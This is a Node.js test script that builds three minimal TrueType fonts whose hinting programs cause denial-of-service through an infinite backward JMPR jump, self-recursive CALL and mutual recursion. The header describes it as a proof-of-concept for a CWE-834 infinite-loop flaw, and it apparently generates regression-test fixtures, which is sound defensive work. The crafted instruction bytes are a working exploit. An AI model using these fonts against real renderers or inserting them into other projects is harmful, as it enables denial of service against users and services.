/**
 * Generates minimal TrueType fonts with crafted hinting instructions that
 * trigger denial-of-service vectors in the hinting VM.
 *
 * This is a proof-of-concept for CVE: TrueType Hinting VM Infinite Loop (CWE-834).
 *
 * Three fonts are generated:
 *   1. HintingJMPRLoop.ttf   - JMPR with negative offset creates infinite backward jump
 *   2. HintingRecursiveCALL.ttf - Function that CALLs itself, causing infinite recursion
 *   3. HintingMutualRecursion.ttf - Two functions that CALL each other in a cycle
 *
 * Usage: node test/generate-hinting-dos-fonts.mjs
 * Output: test/fonts/HintingJMPRLoop.ttf
 *         test/fonts/HintingRecursiveCALL.ttf
 *         test/fonts/HintingMutualRecursion.ttf
 */

import { writeFileSync } from 'fs';
import { dirname, join } from 'path';
import { fileURLToPath } from 'url';
import { u16, u32, i16, tag, makeHead, makePost, assembleFont } from './font-generation-helpers.mjs';

const __dirname = dirname(fileURLToPath(import.meta.url));

// --- table builders ---

function makeHhea() {
    return [
        ...u16(1), ...u16(0),          // version
        ...i16(800),                   // ascender
        ...i16(-200),                  // descender
        ...i16(0),                      // lineGap
        ...u16(600),                   // advanceWidthMax
        ...i16(0),                      // minLeftSideBearing
        ...i16(0),                      // minRightSideBearing
        ...i16(600),                   // xMaxExtent
        ...i16(1),                      // caretSlopeRise
        ...i16(0),                      // caretSlopeRun
        ...i16(0),                      // caretOffset
        ...i16(0), ...i16(0), ...i16(0), ...i16(0), // reserved
        ...i16(0),                      // metricDataFormat
        ...u16(1),                      // numberOfHMetrics
    ];
}

function makeMaxp() {
    return [
        ...u16(1), ...u16(0),          // version 1.0
        ...u16(1),                      // numGlyphs
        ...u16(64),                    // maxPoints
        ...u16(1),                      // maxContours
        ...u16(0),                      // maxCompositePoints
        ...u16(0),                      // maxCompositeContours
        ...u16(1),                      // maxZones
        ...u16(0),                      // maxTwilightPoints
        ...u16(16),                    // maxStorage
        ...u16(16),                    // maxFunctionDefs
        ...u16(0),                      // maxInstructionDefs
        ...u16(64),                    // maxStackElements
        ...u16(0),                      // maxSizeOfInstructions
        ...u16(0),                      // maxComponentElements
        ...u16(0),                      // maxComponentDepth
    ];
}

function makeOS2() {
    const os2 = new Array(78).fill(0);
    // version = 1
    os2[0] = 0x00; os2[1] = 0x01;
    // xAvgCharWidth = 600
    os2[2] = 0x02; os2[3] = 0x58;
    // usWeightClass = 400
    os2[4] = 0x01; os2[5] = 0x90;
    // usWidthClass = 5 (Medium)
    os2[6] = 0x00; os2[7] = 0x05;
    // sTypoAscender = 800 (offset 68)
    os2[68] = 0x03; os2[69] = 0x20;
    // sTypoDescender = -200 (offset 70)
    os2[70] = 0xFF; os2[71] = 0x38;
    // usWinAscent = 1000 (offset 74)
    os2[74] = 0x03; os2[75] = 0xE8;
    // usWinDescent = 1000 (offset 76)
    os2[76] = 0x03; os2[77] = 0xE8;
    return os2;
}

function makeName(familyName) {
    const family = [];
    for (let i = 0; i < familyName.length; i++) {
        family.push((familyName.charCodeAt(i) >> 8) & 0xFF);
        family.push(familyName.charCodeAt(i) & 0xFF);
    }
    const styleStr = 'Regular';
    const style = [];
    for (let i = 0; i < styleStr.length; i++) {
        style.push((styleStr.charCodeAt(i) >> 8) & 0xFF);
        style.push(styleStr.charCodeAt(i) & 0xFF);
    }
    const records = [
        { nameID: 1, data: family },
        { nameID: 2, data: style },
        { nameID: 4, data: family },
        { nameID: 6, data: family },
    ];
    const stringOffset = 6 + records.length * 12;
    const result = [...u16(0), ...u16(records.length), ...u16(stringOffset)];
    let strOff = 0;
    for (const rec of records) {
        result.push(...u16(3), ...u16(1), ...u16(0x0409));
        result.push(...u16(rec.nameID), ...u16(rec.data.length), ...u16(strOff));
        strOff += rec.data.length;
    }
    for (const rec of records) result.push(...rec.data);
    return result;
}

function makeCmap() {
    // Format 4 with just the 0xFFFF sentinel segment
    return [
        ...u16(0),          // version
        ...u16(1),          // numTables
        ...u16(3),          // platformID (Windows)
        ...u16(1),          // encodingID (Unicode BMP)
        ...u32(12),         // offset to subtable
        // format 4 subtable
        ...u16(4),          // format
        ...u16(22),         // length (14 + 1*8)
        ...u16(0),          // language
        ...u16(2),          // segCountX2
        ...u16(2),          // searchRange
        ...u16(0),          // entrySelector
        ...u16(0),          // rangeShift
        ...u16(0xFFFF),     // endCount sentinel
        ...u16(0),          // reservedPad
        ...u16(0xFFFF),     // startCount sentinel
        ...u16(1),          // idDelta sentinel
        ...u16(0),          // idRangeOffset sentinel
    ];
}

function makeLoca() {
    // Short format, 1 glyph: offset 0, end 0 (empty)
    return [...u16(0), ...u16(0)];
}

function makeHmtx() {
    return [...u16(600), ...i16(0)]; // advanceWidth, lsb
}

// --- font assembler ---

function buildFont(familyName, fpgmInstructions) {
    const tables = {
        'head': makeHead(),
        'hhea': makeHhea(),
        'maxp': makeMaxp(),
        'OS/2': makeOS2(),
        'name': makeName(familyName),
        'cmap': makeCmap(),
        'post': makePost({ underlinePosition: -512, underlineThickness: 80 }),
        'loca': makeLoca(),
        'glyf': [],  // empty — glyph 0 has zero length per loca
        'hmtx': makeHmtx(),
        'fpgm': [...fpgmInstructions],
    };

    return assembleFont(tables);
}

// --- POC font definitions ---

// 1. JMPR with negative offset: infinite backward jump
//    PUSHW[0] -3, JMPR  →  ip jumps back to byte 0 each iteration
const jmprLoopFpgm = [
    0xB8,       // PUSHW[0] (push one 16-bit value)
    0xFF, 0xFD, // -3 as signed 16-bit
    0x1C,       // JMPR
];

// 2. Recursive CALL: function 0 calls itself
//    FDEF 0 { CALL 0 } ENDF; CALL 0
const recursiveCallFpgm = [
    0xB0, 0x00, // PUSHB[0] 0
    0x2C,       // FDEF
    0xB0, 0x00, // PUSHB[0] 0
    0x2B,       // CALL (self-recursion)
    0x2D,       // ENDF
    0xB0, 0x00, // PUSHB[0] 0
    0x2B,       // CALL
];

// 3. Mutual recursion: function 0 calls function 1, function 1 calls function 0
const mutualRecursionFpgm = [
    // FDEF 0: CALL 1
    0xB0, 0x00, // PUSHB[0] 0
    0x2C,       // FDEF
    0xB0, 0x01, // PUSHB[0] 1
    0x2B,       // CALL
    0x2D,       // ENDF
    // FDEF 1: CALL 0
    0xB0, 0x01, // PUSHB[0] 1
    0x2C,       // FDEF
    0xB0, 0x00, // PUSHB[0] 0
    0x2B,       // CALL
    0x2D,       // ENDF
    // trigger
    0xB0, 0x00, // PUSHB[0] 0
    0x2B,       // CALL
];

// --- generate ---

const fonts = [
    { name: 'HintingJMPRLoop', fpgm: jmprLoopFpgm },
    { name: 'HintingRecursiveCALL', fpgm: recursiveCallFpgm },
    { name: 'HintingMutualRecursion', fpgm: mutualRecursionFpgm },
];

for (const { name, fpgm } of fonts) {
    const bytes = buildFont(name, fpgm);
    const outPath = join(__dirname, 'fonts', name + '.ttf');
    writeFileSync(outPath, bytes);
    console.log(`Written ${bytes.length} bytes to ${outPath}`);
}
